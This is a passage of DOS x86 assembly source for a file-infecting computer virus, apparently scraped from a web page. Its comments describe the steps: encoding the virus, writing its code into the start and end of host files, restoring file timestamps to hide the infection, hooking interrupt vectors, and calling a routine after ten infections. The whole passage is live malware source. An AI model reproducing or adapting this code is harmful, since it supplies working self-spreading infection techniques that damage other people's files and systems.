	      mov    ax,word ptr cs:[oldint13+2] ; exchange int13 vectors
	      xchg   ax,word ptr ds:[4*13+2]	 ;
	      mov    word ptr cs:[oldint13+2],ax ;
	      sti				 ;
	      pop    ds 			 ;
 
	      ret
 
mod_8_cont:
	      push   bx
	      call   word ptr cs:[tabb]	 ; code virus
	      pop    bx
 
	      mov    dx,100			 ;
	      mov    ah,40			 ; write code in begin
	      mov    cx,offset myend-0ff
	      pushf				 ;
	      call   cs:stdint21		 ;
 
	      pushf
	      push   bx
	      call   word ptr cs:[tabb]	 ; decode virus
	      pop    bx
	      popf
	      jnc    mod_8_cont1
	      pop    ax
	      mov    ax,word ptr cs:[tabb+0e]
	      add    ax,offset mod_8_ext - offset mod_8
	      push   ax
	      ret
mod_8_cont1:
	      mov    ax,es:[di+11]		 ; fp:=end of file
	      mov    word ptr es:[di+15],ax	 ;
 
	      mov    dx,offset myend+1
	      mov    cx,bp			 ; bp - files read
	      mov    ah,40			 ;
	      pushf				 ;
	      call   cs:stdint21		 ; write in end of file
 
	      ret
 
mod_8_cont_end:
	      mov    ax,5701	 ;
	      mov    cx,cs:ftime ;
	      mov    dx,cs:fdate ; restore file date/time
	      pushf		 ;
	      call   cs:oldint21 ;
 
	      inc    cs:files
	      cmp    cs:files,0a
	      jne    mod_8_ext
	      call   word ptr cs:[tabb+8]
	      jmp    short mod_8_ext
mod_8_exit:
	      stc
	      jmp    short mod_8_ex
mod_8_ext:
	      clc
mod_8_ex:
	      pop    bp
	      pop    di
	      pop    es
	      pop    ds
	      pop    dx
	      pop    cx
	      ret
 
;---------------------------------------------------------------
 
myend	      db   0
 
	      int    20 	       ;code of infected file
 
false_mod_1:
	      mov     word ptr cs:[tabb],offset mod_1
	      ret
 
code	      ends
	      end  start
 
</textarea></td></tr></table></body></html>
